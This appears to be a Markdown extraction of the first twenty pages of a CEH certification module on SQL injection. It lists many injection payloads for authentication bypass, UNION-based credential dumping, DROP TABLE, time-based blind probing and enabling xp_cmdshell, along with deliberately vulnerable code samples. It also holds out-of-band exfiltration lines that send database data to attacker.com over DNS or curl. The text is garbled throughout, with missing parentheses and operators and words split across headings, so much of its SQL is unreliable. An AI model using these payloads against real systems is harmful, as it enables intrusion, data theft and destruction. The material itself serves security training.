# 📜 07. Full PDF Reference — SQL Injection

> [!INFO] 🏛️ **Official CEH v13 PDF Source Master Repository**
> Cleaned, high-readability technical text extraction directly from official CEH v13 Syllabus PDF (`CEH_v13__Module_15_SQL_Injection.pdf`). Formatted as structured Markdown prose with proper paragraphs, section headers, and key term highlights.

---

## 📊 Syllabus Metadata & Source Breakdown

> [!ABSTRACT] 📋 **Comprehensive PDF Syllabus Metadata Reference Matrix**

| Metadata Attribute | Syllabus Parameter Value |
| :--- | :--- |
| **Course Module** | **Module 15: SQL Injection** |
| **Source PDF File** | `CEH_v13__Module_15_SQL_Injection.pdf` |
| **Total Extracted Pages** | `45 Pages` |
| **Formatting Standard** | Ultra-Readable Markdown Prose & Structured Headings |
| **Extraction Status** | 100% Complete / Verified Text Flow |

---

## 📑 Structured & Readable Syllabus Reference

> [!NOTE]- 📄 **Pages 1 to 5 Syllabus Content**
>
> ### 📍 Page 1
>
> 
> #### 🔹 💉
> 
> 
> 
> #### 🔹 Injection
> 
> 
> 
> #### 🔹 SQL Injection
> 
> 
> 
> #### 🔹 📋Module Overview
> 
> 
> This module covers SQL injection vulnerabilities, attack techniques,
> 
> 
> #### 🔹 and defensive countermeasures. Topics include SQL injection
> 
> 
> concepts, injection types (in-band, blind, out-of-band), attack methodology, advanced exploitation techniques, evasion methods, NoSQL injection, automated tools, and comprehensive defenses against SQL injection attacks.
> 
> 
> #### 🔹 1. SQL Injection Concepts
> 
> 
> 
> #### 🔹 1.1 What is SQL Injection?
> 
> 
> 
> #### 🔹 💉SQL Injection SQLi) Definition
> 
> 
> An attack that allows attackers to inject malicious SQL queries into application inputs to manipulate the backend database, leading to authentication bypass, data extraction, modification, deletion, and potentially remote code execution.
> 
> 
> #### 🔹 Attack Capabilities:
> 
> 
> 
> #### 🔹 Authentication bypass  Login without credentials
> 
>
> ---
>
> ### 📍 Page 2
>
> 
> #### 🔹 Extracting data  Dump database contents
> 
> 
> 
> #### 🔹 Updating records  Modify database entries
> 
> 
> 
> #### 🔹 Deleting records  Remove data
> 
> 
> 
> #### 🔹 Reading OS files  Access file system
> 
> 
> Remote Code Execution RCE  Execute commands (some DB engines)
> 
> 
> #### 🔹 Privilege escalation  Gain admin access
> 
> 
> 
> #### 🔹 Denial of Service  Crash database
> 
> 
> 
> #### 🔹 Impact:
> 
> 
> 
> #### 🔹 Data breaches
> 
> 
> 
> #### 🔹 Complete system compromise
> 
> 
> 
> #### 🔹 Regulatory penalties
> 
> 
> 
> #### 🔹 Reputation damage
> 
> 
> 
> #### 🔹 Financial losses
> 
> 
> 
> #### 🔹 1.2 SQL Injection and Server-side Technologies
> 
> 
> 
> #### 🔹 Vulnerable Database Systems:
> 
> 
> 
> #### 🔹 All SQL-based databases are potentially vulnerable:
> 
> 
> 
> #### 🔹 MySQL  Open-source relational database
> 
> 
> 
> #### 🔹 Microsoft SQL Server MSSQL  Enterprise database
> 
> 
> 
> #### 🔹 Oracle Database  Enterprise-grade RDBMS
> 
> 
> 
> #### 🔹 PostgreSQL  Advanced open-source database
> 
> 
> 
> #### 🔹 SQLite  Embedded database
> 
> 
> 
> #### 🔹 MariaDB  MySQL fork
> 
> 
> 
> #### 🔹 Vulnerable Server-Side Languages:
> 
> 
> 
> #### 🔹 PHP
> 
> 
> 
> #### 🔹 mysql_query("SELECT * FROM users WHERE id=" . $_GET'id']);
> 
> 
> mysqli_query($conn, "SELECT * FROM users WHERE id=" . $_GET'id']);
> 
> 
> #### 🔹 // PDO (safe if used correctly)
> 
>
> ---
>
> ### 📍 Page 3
>
> 
> #### 🔹 ASP.NET
> 
> 
> string query = "SELECT * FROM users WHERE id="  Request.QueryString
> 
> 
> #### 🔹 ["id"];
> 
> 
> 
> #### 🔹 SqlCommand cmd = new SqlCommand(query, connection);
> 
> 
> 
> #### 🔹 Java JDBC
> 
> 
> String query = "SELECT * FROM users WHERE id=" + request.getParamete
> 
> 
> #### 🔹 r("id");
> 
> 
> 
> #### 🔹 Statement stmt = connection.createStatement();
> 
> 
> 
> #### 🔹 ResultSet rs = stmt.executeQuery(query);
> 
> 
> 
> #### 🔹 Python:
> 
> 
> 
> #### 🔹 cursor.execute("SELECT * FROM users WHERE id=" + user_id)
> 
> 
> 
> #### 🔹 Others:
> 
> 
> 
> #### 🔹 Ruby on Rails
> 
> 
> 
> #### 🔹 Perl
> 
> 
> 
> #### 🔹 Node.js (mysql, pg modules)
> 
> 
> 
> #### 🔹 1.3 Understanding HTTP POST Request
> 
> 
> 
> #### 🔹 POST Request Vulnerability:
> 
> 
> 
> #### 🔹 POST requests may contain injectable parameters in:
> 
> 
> 
> #### 🔹 Form fields — username=admin&password=pass
> 
> 
> 
> #### 🔹 JSON bodies — {"username": "admin"}
> 
> 
> 
> #### 🔹 XML — <username>admin</username>
> 
> 
> 
> #### 🔹 File uploads  Filename parameters
> 
> 
> 
> #### 🔹 Multipart data  Form-data fields
> 
> 
> 
> #### 🔹 Example POST Body:
> 
> 
> 
> #### 🔹 username=admin&password=admin
> 
>
> ---
>
> ### 📍 Page 4
>
> 
> #### 🔹 Vulnerable Processing:
> 
> 
> $query = "SELECT * FROM users WHERE username='" . $_POST'usernam
> 
> 
> #### 🔹 e'] . "' AND password='" . $_POST'password'] . "'";
> 
> 
> 
> #### 🔹 1.4 Understanding Normal SQL Query
> 
> 
> 
> #### 🔹 Legitimate Query:
> 
> 
> SELECT * FROM users WHERE username='john' AND password='1234';
> 
> 
> #### 🔹 Query Execution:
> 
> 
> 
> #### 🔹  Application receives user input
> 
> 
> 
> #### 🔹  Builds SQL query with input
> 
> 
> 
> #### 🔹  Sends to database
> 
> 
> 
> #### 🔹  Database executes query
> 
> 
> 
> #### 🔹  Returns results
> 
> 
> 
> #### 🔹  Application processes results
> 
> 
> 
> #### 🔹 1.5 Understanding SQL Injection Query
> 
> 
> 
> #### 🔹 🔓Injection Manipulation
> 
> 
> By injecting SQL metacharacters and logic, attackers can alter the query structure to bypass authentication or extract unauthorized data.
> 
> 
> #### 🔹 Injected Version:
> 
> 
> 
> #### 🔹 Original Query:
> 
> 
> SELECT * FROM users WHERE username='INPUT' AND password='INPU
> 
> 
> #### 🔹 T';
> 
> 
> 
> #### 🔹 Malicious Input:
> 
>
> ---
>
> ### 📍 Page 5
>
> 
> #### 🔹 Username: ' OR '1'='1' --
> 
> 
> 
> #### 🔹 Password: (anything)
> 
> 
> 
> #### 🔹 Resulting Query:
> 
> 
> SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password
> 
> 
> #### 🔹 ='';
> 
> 
> 
> #### 🔹 Query Analysis:
> 
> 
> 
> #### 🔹 username=''   False condition
> 
> 
> 
> #### 🔹 OR '1'='1'   Always true
> 
> 
> --  SQL comment (ignores rest)
> 
> 
> #### 🔹 Result: Query always returns true, bypassing authentication
> 
> 
> 
> #### 🔹 1.6 SQL Injection Query — Code Analysis
> 
> 
> 
> #### 🔹 Vulnerable Code Example:
> 
> 
> 
> #### 🔹 C#/ASP.NET
> 
> 
> string query = "SELECT * FROM products WHERE id='" + id + "'";
> 
> 
> #### 🔹 SqlCommand cmd = new SqlCommand(query, connection);
> 
> 
> 
> #### 🔹 Exploitation:
> 
> 
> 
> #### 🔹 Normal: id=1
> 
> 
> 
> #### 🔹 Injected: id=1' OR 11 
> 
> 
> 
> #### 🔹 Resulting Query:
> 
> 
> 
> #### 🔹 SELECT * FROM products WHERE id='1' OR 11 '
> 
> 
> 
> #### 🔹 1.7 Vulnerable Web Application Example
> 
> 
> 
> #### 🔹 Example URL
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 6 to 10 Syllabus Content**
>
> ### 📍 Page 6
>
> 
> #### 🔹 ProductList.aspx?ProductID10
> 
> 
> 
> #### 🔹 Vulnerable Code:
> 
> 
> string query = "SELECT * FROM products WHERE ProductID"  Request.Q
> 
> 
> #### 🔹 ueryString["ProductID"];
> 
> 
> 
> #### 🔹 Injectable Payload:
> 
> 
> 
> #### 🔹 ProductID10 OR 11 
> 
> 
> 
> #### 🔹 ProductID10 UNION SELECT null,null,null --
> 
> 
> 
> #### 🔹 ProductID10; DROP TABLE products --
> 
> 
> 
> #### 🔹 1.8 Examples of SQL Injection
> 
> 
> 
> #### 🔹 Common Payloads:
> 
> 
> 
> #### 🔹 Authentication Bypass:
> 
> 
> 
> #### 🔹 ' OR 11 
> 
> 
> 
> #### 🔹 ' OR '1'='1' --
> 
> 
> 
> #### 🔹 admin' --
> 
> 
> 
> #### 🔹 admin' #
> 
> 
> 
> #### 🔹 ' OR 'x'='x
> 
> 
> 
> #### 🔹 ' OR '1'='1
> 
> 
> 
> #### 🔹 UNION Injection:
> 
> 
> 
> #### 🔹 ' UNION SELECT null,null,null --
> 
> 
> 
> #### 🔹 ' UNION SELECT username,password,null FROM users --
> 
> 
> 
> #### 🔹 Stacked Queries:
> 
> 
> 
> #### 🔹 '; DROP TABLE users; --
> 
> 
> '; UPDATE users SET password='hacked' WHERE username='admin'; --
> 
> 
> #### 🔹 Time-Based:
> 
>
> ---
>
> ### 📍 Page 7
>
> 
> #### 🔹 ' AND SLEEP5 
> 
> 
> 
> #### 🔹 ' OR IF11, SLEEP5, 0 
> 
> 
> 
> #### 🔹 2. Types of SQL Injection
> 
> 
> 
> #### 🔹 2.1 In-Band SQL Injection
> 
> 
> 
> #### 🔹 📡In-Band SQL Injection
> 
> 
> Attacker receives output in the same communication channel used to send the injection, making it the most straightforward and common type of SQL injection.
> 
> 
> #### 🔹 Error-Based SQL Injection
> 
> 
> 
> #### 🔹 Extract Information via Error Messages:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 AND updatexml(1, concat(0x7e, SELECT user()), 0x7e), 1)
> 
> 
> 
> #### 🔹 AND extractvalue(1, concat(0x7e, database()))
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹 AND 1CONVERT(int, SELECT @@version))
> 
> 
> 
> #### 🔹 AND 1CASTSELECT user) AS int)
> 
> 
> 
> #### 🔹 Oracle:
> 
> 
> 
> #### 🔹 AND 1CAST(user AS number)
> 
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 AND 1CASTSELECT version()) AS int)
> 
> 
> 
> #### 🔹 Example Output:
> 
>
> ---
>
> ### 📍 Page 8
>
> Microsoft SQL Server Error: Conversion failed when converting 'Microsoft
> 
> 
> #### 🔹 SQL Server 2019'
> 
> 
> 
> #### 🔹 UNION SQL Injection
> 
> 
> 
> #### 🔹 Combine Results from Multiple Queries:
> 
> 
> 
> #### 🔹 Determine Column Count:
> 
> 
> 
> #### 🔹 ' ORDER BY 1 
> 
> 
> 
> #### 🔹 ' ORDER BY 2 
> 
> 
> 
> #### 🔹 ' ORDER BY 3 
> 
> 
> 
> #### 🔹 Continue until error)
> 
> 
> 
> #### 🔹 Find NULLCompatible Columns:
> 
> 
> 
> #### 🔹 ' UNION SELECT NULL 
> 
> 
> 
> #### 🔹 ' UNION SELECT NULL,NULL 
> 
> 
> 
> #### 🔹 ' UNION SELECT NULL,NULL,NULL 
> 
> 
> 
> #### 🔹 Extract Data:
> 
> 
> 
> #### 🔹 ' UNION SELECT username,password,email FROM users --
> 
> 
> ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables -- ' UNION SELECT column_name,NULL,NULL FROM information_schema.col
> 
> 
> #### 🔹 umns WHERE table_name='users' --
> 
> 
> 
> #### 🔹 2.2 Blind / Inferential SQL Injection
> 
> 
> 
> #### 🔹 🕵Blind SQL Injection
> 
> 
> No direct output or error messages displayed. Attackers infer information based on application behavior, response timing, or true/false conditions.
> 
> 
> #### 🔹 Boolean-Based Blind SQLi
> 
>
> ---
>
> ### 📍 Page 9
>
> 
> #### 🔹 True/False Condition Testing:
> 
> 
> 
> #### 🔹 Test for Injection:
> 
> 
> 
> #### 🔹 ' AND 11   Application behaves normally  True)
> 
> 
> 
> #### 🔹 ' AND 12   Application behaves differently  False)
> 
> 
> 
> #### 🔹 Extract Data Character by Character:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT database()),1,1'a' --
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT database()),1,1'b' --
> 
> 
> 
> #### 🔹 Continue until true response)
> 
> 
> 
> #### 🔹 ' AND ASCIISUBSTRINGSELECT user()),1,1114 
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT DB_NAME,1,1'm' --
> 
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT current_database()),1,1'p' --
> 
> 
> 
> #### 🔹 Time-Based Blind SQL Injection
> 
> 
> 
> #### 🔹 Delay-Based Information Extraction:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 ' AND IF11, SLEEP5, 0 
> 
> 
> 
> #### 🔹 ' AND BENCHMARK5000000, MD5'test')) --
> 
> 
> ' AND SELECT SLEEP5 FROM users WHERE username='admin') --
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹 ' IF11 WAITFOR DELAY '005' --
> 
> 
> 
> #### 🔹 ' IFSELECT user)='sa' WAITFOR DELAY '005' --
> 
>
> ---
>
> ### 📍 Page 10
>
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 ' AND SELECT pg_sleep(5)) --
> 
> 
> ' AND CASE WHEN 11 THEN pg_sleep(5) ELSE pg_sleep(0) END 
> 
> 
> #### 🔹 Oracle:
> 
> 
> 
> #### 🔹 ' AND dbms_pipe.receive_message('a',51 
> 
> 
> 
> #### 🔹 SQLite:
> 
> 
> ' AND SELECT count(*) FROM sqlite_master UNION SELECT randomblob(1
> 
> 
> #### 🔹 00000000 
> 
> 
> 
> #### 🔹 Heavy Query Blind SQLi
> 
> 
> 
> #### 🔹 Resource Exhaustion for Detection:
> 
> 
> 
> #### 🔹 Use computationally expensive queries:
> 
> 
> ' AND SELECT COUNT* FROM large_table a, large_table b, large_table c)
> 
> 
> #### 🔹  0 
> 
> 
> ' AND SELECT COUNT* FROM information_schema.tables t1, information
> 
> 
> #### 🔹 _schema.tables t2  0 
> 
> 
> 
> #### 🔹 Response Time Indicates Success:
> 
> 
> 
> #### 🔹 Long delay  True condition
> 
> 
> 
> #### 🔹 Normal response  False condition
> 
> 
> 
> #### 🔹 2.3 Out-of-Band SQL Injection
> 
> 
> 
> #### 🔹 🌐Out-of-Band SQL Injection
> 
> 
> Uses alternative channels like DNS or HTTP requests to exfiltrate data when in-band methods are unavailable or restricted.
> 
> 
> #### 🔹 DNS Exfiltration:
> 
> 
> 
> #### 🔹 MySQL
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 11 to 15 Syllabus Content**
>
> ### 📍 Page 11
>
> SELECT LOAD_FILECONCAT'\\\\\\\\', SELECT user()), '.attacker.com\\\\ab
> 
> 
> #### 🔹 c'))
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> '; EXEC master..xp_dirtree '\\\\' + SELECT DB_NAME  '.attacker.com\\sh
> 
> 
> #### 🔹 are' --
> 
> 
> '; DECLARE @q varchar(1024); SET @q='\\\\' + SELECT user) + '.attacker.c
> 
> 
> #### 🔹 om\\a'; EXEC master..xp_dirtree @q --
> 
> 
> 
> #### 🔹 HTTP Callback:
> 
> 
> 
> #### 🔹 Oracle:
> 
> 
> SELECT UTL_HTTP.REQUEST'http://attacker.com/' || SELECT user FROM
> 
> 
> #### 🔹 dual)) FROM dual
> 
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> COPY SELECT user) TO PROGRAM 'curl http://attacker.com?data=' || SEL
> 
> 
> #### 🔹 ECT user)
> 
> 
> 
> #### 🔹 Detection:
> 
> 
> 
> #### 🔹 Monitor DNS queries
> 
> 
> 
> #### 🔹 Analyze outbound HTTP requests
> 
> 
> 
> #### 🔹 Check firewall logs
> 
> 
> 
> #### 🔹 3. SQL Injection Methodology
> 
> 
> 
> #### 🔹 3.1 Information Gathering & Vulnerability Detection
> 
> 
> 
> #### 🔹 Step 1: Information Gathering
> 
> 
> 
> #### 🔹 Identify Attack Surface:
> 
> 
> 
> #### 🔹 Entry points  All user inputs
> 
> 
> 
> #### 🔹 Parameters  GET/POST parameters
> 
>
> ---
>
> ### 📍 Page 12
>
> 
> #### 🔹 Cookies  Session and tracking cookies
> 
> 
> 
> #### 🔹 HTTP Headers  User-Agent, Referer, XForwarded-For
> 
> 
> 
> #### 🔹 JSON values  API request bodies
> 
> 
> 
> #### 🔹 Hidden fields  Form hidden inputs
> 
> 
> 
> #### 🔹 File uploads  Filename parameters
> 
> 
> 
> #### 🔹 Step 2: Identify Data Entry Paths
> 
> 
> 
> #### 🔹 Input Vectors:
> 
> 
> 
> #### 🔹 GET parameters — ?id=1&page=home
> 
> 
> 
> #### 🔹 POST bodies  Form submissions
> 
> 
> 
> #### 🔹 API endpoints  RESTful/GraphQL APIs
> 
> 
> 
> #### 🔹 WebSocket messages  Real-time communication
> 
> 
> 
> #### 🔹 XML/SOAP  Web service requests
> 
> 
> 
> #### 🔹 Custom headers  Application-specific headers
> 
> 
> 
> #### 🔹 Step 3: Extract Information Through Error Messages
> 
> 
> 
> #### 🔹 Valuable Error Messages:
> 
> 
> 
> #### 🔹 SQL Error Examples:
> 
> 
> 
> #### 🔹 SQLException: Incorrect syntax near ''
> 
> 
> 
> #### 🔹 MySQL Error: You have an error in your SQL syntax
> 
> 
> 
> #### 🔹 ODBC Error: Microsoft][ODBC SQL Server Driver]
> 
> 
> 
> #### 🔹 ORA01756 quoted string not properly terminated
> 
> 
> 
> #### 🔹 psycopg2.ProgrammingError: syntax error at or near "'"
> 
> 
> 
> #### 🔹 Information Revealed:
> 
> 
> 
> #### 🔹 Database type and version
> 
> 
> 
> #### 🔹 Query structure
> 
> 
> 
> #### 🔹 Table/column names
> 
> 
> 
> #### 🔹 File paths
> 
> 
> 
> #### 🔹 Step 4: SQL Injection Vulnerability Detection
> 
>
> ---
>
> ### 📍 Page 13
>
> 
> #### 🔹 Test Payloads:
> 
> 
> 
> #### 🔹 Basic Detection:
> 
> 
> 
> #### 🔹 '
> 
> 
> 
> #### 🔹 "
> 
> 
> 
> #### 🔹 `
> 
> 
> 
> #### 🔹 ')
> 
> 
> 
> #### 🔹 ")
> 
> 
> 
> #### 🔹 `)
> 
> 
> 
> #### 🔹 ' OR '1'='1
> 
> 
> 
> #### 🔹 ' AND 11 
> 
> 
> 
> #### 🔹 ' AND 12 
> 
> 
> 
> #### 🔹 Numeric Context:
> 
> 
> 
> #### 🔹 1 OR 11
> 
> 
> 
> #### 🔹 1 AND 11
> 
> 
> 
> #### 🔹 1 AND 12
> 
> 
> 
> #### 🔹 String Context:
> 
> 
> 
> #### 🔹 ' OR '1'='1' --
> 
> 
> 
> #### 🔹 ' OR 'x'='x' --
> 
> 
> 
> #### 🔹 admin' --
> 
> 
> 
> #### 🔹 Step 5: Additional Detection Methods
> 
> 
> 
> #### 🔹 Fuzzing Techniques:
> 
> 
> 
> #### 🔹 Fuzz all parameters systematically
> 
> 
> 
> #### 🔹 Test encoding variants URL, hex, unicode)
> 
> 
> 
> #### 🔹 Use special characters (' " ; -- # /* */ )
> 
> 
> 
> #### 🔹 Automated Scanners:
> 
> 
> 
> #### 🔹 # Nmap NSE
> 
> 
> 
> #### 🔹 nmap --script http-sql-injection target.com
> 
>
> ---
>
> ### 📍 Page 14
>
> 
> #### 🔹 # SQLmap
> 
> 
> 
> #### 🔹 sqlmap -u "http://target.com?id=1"
> 
> 
> 
> #### 🔹 Step 6: Black Box Penetration Testing
> 
> 
> 
> #### 🔹 Tools:
> 
> 
> 
> #### 🔹 Burp Suite  Intercept and modify requests
> 
> 
> 
> #### 🔹 OWASP ZAP  Automated scanner
> 
> 
> 
> #### 🔹 SQLmap  Automated SQL injection tool
> 
> 
> 
> #### 🔹 Havij  GUI-based tool
> 
> 
> 
> #### 🔹 jSQL Injection  Java-based tool
> 
> 
> 
> #### 🔹 Step 7: Source Code Review
> 
> 
> 
> #### 🔹 Search for Vulnerable Code:
> 
> 
> 
> #### 🔹 Dangerous Patterns:
> 
> 
> 
> #### 🔹 // PHP
> 
> 
> 
> #### 🔹 mysql_query("SELECT * FROM users WHERE id=" . $_GET'id']);
> 
> 
> $query = "SELECT * FROM products WHERE name='" . $name . "'";
> 
> 
> #### 🔹 // ASP.NET
> 
> 
> 
> #### 🔹 string query = "SELECT * FROM users WHERE id=" + userId;
> 
> 
> 
> #### 🔹 // Java
> 
> 
> String query = "SELECT * FROM users WHERE id=" + request.getParamete
> 
> 
> #### 🔹 r("id");
> 
> 
> 
> #### 🔹 statement.executeQuery(query);
> 
> 
> 
> #### 🔹 // Python
> 
> 
> 
> #### 🔹 cursor.execute("SELECT * FROM users WHERE id=" + user_id)
> 
> 
> 
> #### 🔹 Look for:
> 
> 
> 
> #### 🔹 String concatenation in queries
> 
> 
> 
> #### 🔹 Dynamic query building
> 
> 
> 
> #### 🔹 No parameterization
> 
>
> ---
>
> ### 📍 Page 15
>
> 
> #### 🔹 Missing input validation
> 
> 
> 
> #### 🔹 Step 8: Testing Blind SQL Injection
> 
> 
> 
> #### 🔹 Time-Based Testing:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 ' AND IF11, SLEEP5, 0 
> 
> 
> 
> #### 🔹 ' AND SELECT IF(user()='root', SLEEP5, 0 
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹 ' IF11 WAITFOR DELAY '005' --
> 
> 
> 
> #### 🔹 ' IFSELECT user)='sa' WAITFOR DELAY '005' --
> 
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 ' AND SELECT pg_sleep(5)) --
> 
> 
> 
> #### 🔹 Oracle:
> 
> 
> 
> #### 🔹 ' AND dbms_pipe.receive_message('a',51 
> 
> 
> 
> #### 🔹 3.2 Launch SQL Injection Attacks
> 
> 
> 
> #### 🔹 Error-Based SQL Injection
> 
> 
> 
> #### 🔹 Extract Data via Errors:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> ' AND updatexml(1, concat(0x7e, SELECT user()), 0x7e), 1) --
> 
> 
> #### 🔹 ' AND extractvalue(1, concat(0x7e, database())) --
> 
> 
> ' AND SELECT 1 FROM SELECT COUNT*, CONCATSELECT user()), 0x 3a, FLOORRAND*2 x FROM information_schema.tables GROUP BY x) y) --
> 
> 
> #### 🔹 MSSQL
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 16 to 20 Syllabus Content**
>
> ### 📍 Page 16
>
> 
> #### 🔹 ' AND 1CONVERT(int, SELECT @@version)) --
> 
> 
> 
> #### 🔹 ' AND 1CASTSELECT DB_NAME AS int) --
> 
> 
> 
> #### 🔹 Stored Procedure Injection
> 
> 
> 
> #### 🔹 MSSQL xp_cmdshell:
> 
> 
> 
> #### 🔹 '; EXEC xp_cmdshell 'whoami' --
> 
> 
> 
> #### 🔹 '; EXEC master..xp_cmdshell 'ping attacker.com' --
> 
> 
> '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_ configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami' --
> 
> 
> #### 🔹 Oracle:
> 
> 
> '; EXECUTE IMMEDIATE 'CREATE USER attacker IDENTIFIED BY password'; --
> 
> 
> #### 🔹 UNION SQL Injection
> 
> 
> 
> #### 🔹 Step-by-Step UNION Attack:
> 
> 
> 
> #### 🔹 1. Determine Column Count:
> 
> 
> 
> #### 🔹 ' ORDER BY 1 
> 
> 
> 
> #### 🔹 ' ORDER BY 2 
> 
> 
> 
> #### 🔹 ' ORDER BY 3 
> 
> 
> 
> #### 🔹 Continue until error)
> 
> 
> 
> #### 🔹 2. Find Compatible Data Types:
> 
> 
> 
> #### 🔹 ' UNION SELECT NULL 
> 
> 
> 
> #### 🔹 ' UNION SELECT NULL,NULL 
> 
> 
> 
> #### 🔹 ' UNION SELECT NULL,NULL,NULL 
> 
> 
> 
> #### 🔹 3. Extract Data:
> 
> 
> 
> #### 🔹 ' UNION SELECT user,database,version() --
> 
> 
> ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --
>
> ---
>
> ### 📍 Page 17
>
> ' UNION SELECT column_name,table_name,NULL FROM information_sche
> 
> 
> #### 🔹 ma.columns WHERE table_name='users' --
> 
> 
> 
> #### 🔹 ' UNION SELECT username,password,email FROM users --
> 
> 
> 
> #### 🔹 Bypass Login Authentication
> 
> 
> 
> #### 🔹 Authentication Bypass Payloads:
> 
> 
> 
> #### 🔹 ' OR 11 
> 
> 
> 
> #### 🔹 ' OR '1'='1' --
> 
> 
> 
> #### 🔹 ' OR ''=' --
> 
> 
> 
> #### 🔹 admin' --
> 
> 
> 
> #### 🔹 admin' #
> 
> 
> 
> #### 🔹 admin'/*
> 
> 
> 
> #### 🔹 ' OR '1'='1
> 
> 
> 
> #### 🔹 ' OR '1'='1' --
> 
> 
> 
> #### 🔹 ' UNION SELECT 'admin', 'fakepass' --
> 
> 
> 
> #### 🔹 Example Login Form:
> 
> 
> 
> #### 🔹 Username: admin' --
> 
> 
> 
> #### 🔹 Password: (anything)
> 
> 
> 
> #### 🔹 Boolean-Based Blind SQLi (MySQL)
> 
> 
> 
> #### 🔹 Character-by-Character Extraction:
> 
> 
> 
> #### 🔹 Extract Database Name:
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT database()),1,1'a' --
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT database()),1,1'b' --
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT database()),1,1'c' --
> 
> 
> 
> #### 🔹 Continue until true)
> 
> 
> 
> #### 🔹 Extract Username:
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT user()),1,1'r' --
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT user()),2,1'o' --
> 
> 
> 
> #### 🔹 ' AND SUBSTRINGSELECT user()),3,1'o' --
> 
>
> ---
>
> ### 📍 Page 18
>
> 
> #### 🔹 Using ASCII
> 
> 
> 
> #### 🔹 ' AND ASCIISUBSTRINGSELECT user()),1,1114 
> 
> 
> 
> #### 🔹 ' AND ASCIISUBSTRINGSELECT user()),1,1100 
> 
> 
> 
> #### 🔹 ' AND ASCIISUBSTRINGSELECT user()),1,1120 
> 
> 
> 
> #### 🔹 Extract Database User
> 
> 
> 
> #### 🔹  MySQL
> 
> 
> 
> #### 🔹 ' UNION SELECT user(),NULL,NULL 
> 
> 
> 
> #### 🔹 SELECT USER
> 
> 
> 
> #### 🔹 SELECT CURRENT_USER
> 
> 
> 
> #### 🔹  MSSQL
> 
> 
> 
> #### 🔹 SELECT user
> 
> 
> 
> #### 🔹 SELECT SYSTEM_USER
> 
> 
> 
> #### 🔹  Oracle
> 
> 
> 
> #### 🔹 SELECT user FROM dual
> 
> 
> 
> #### 🔹  PostgreSQL
> 
> 
> 
> #### 🔹 SELECT current_user
> 
> 
> 
> #### 🔹 Extract Database Name
> 
> 
> 
> #### 🔹  MySQL
> 
> 
> 
> #### 🔹 SELECT database()
> 
> 
> 
> #### 🔹 SELECT schema_name FROM information_schema.schemata
> 
> 
> 
> #### 🔹  MSSQL
> 
> 
> 
> #### 🔹 SELECT DB_NAME
> 
> 
> 
> #### 🔹 SELECT name FROM sys.databases
> 
> 
> 
> #### 🔹  Oracle
> 
> 
> 
> #### 🔹 SELECT name FROM v$database
> 
>
> ---
>
> ### 📍 Page 19
>
> 
> #### 🔹  PostgreSQL
> 
> 
> 
> #### 🔹 SELECT current_database()
> 
> 
> 
> #### 🔹 Extract Column Names
> 
> 
> 
> #### 🔹  MySQL/PostgreSQL/MSSQL
> 
> 
> SELECT column_name FROM information_schema.columns WHERE table_n
> 
> 
> #### 🔹 ame='users'
> 
> 
> 
> #### 🔹  Oracle
> 
> 
> SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
> 
> 
> #### 🔹 Extract Data
> 
> 
> 
> #### 🔹 ' UNION SELECT username,password,email FROM users --
> 
> 
> ' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users -- ' UNION SELECT GROUP_CONCAT(username,':',password) FROM users --
> 
> 
> #### 🔹 Regex-Based Extraction
> 
> 
> 
> #### 🔹 Pattern Matching:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 SELECT * FROM users WHERE username REGEXP '^a.*'
> 
> 
> ' AND SELECT username FROM users WHERE username REGEXP '^a') --
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 SELECT * FROM users WHERE username ~ '^a'
> 
> 
> 
> #### 🔹 Double Blind SQL Injection
> 
> 
> 
> #### 🔹 No Input, No Error:
> 
> 
> 
> #### 🔹 Requires time-based techniques with no feedback:
> 
>
> ---
>
> ### 📍 Page 20
>
> 
> #### 🔹 ' AND IFSELECT COUNT* FROM users)>10, SLEEP5, 0 
> 
> 
> ' AND IFSELECT LENGTH(password) FROM users WHERE username='ad
> 
> 
> #### 🔹 min'32, SLEEP5, 0 
> 
> 
> 
> #### 🔹 Out-of-Band SQL Injection
> 
> 
> 
> #### 🔹 DNS Exfiltration:
> 
> 
> 
> #### 🔹 MySQL Windows):
> 
> 
> SELECT LOAD_FILECONCAT'\\\\\\\\', SELECT database()), '.attacker.com
> 
> 
> #### 🔹 \\\\abc'))
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> '; DECLARE @q varchar(100); SET @q='\\\\\\\\' + SELECT DB_NAME  '.a
> 
> 
> #### 🔹 ttacker.com\\\\a'; EXEC master..xp_dirtree @q --
> 
> 
> 
> #### 🔹 HTTP Callback Oracle):
> 
> 
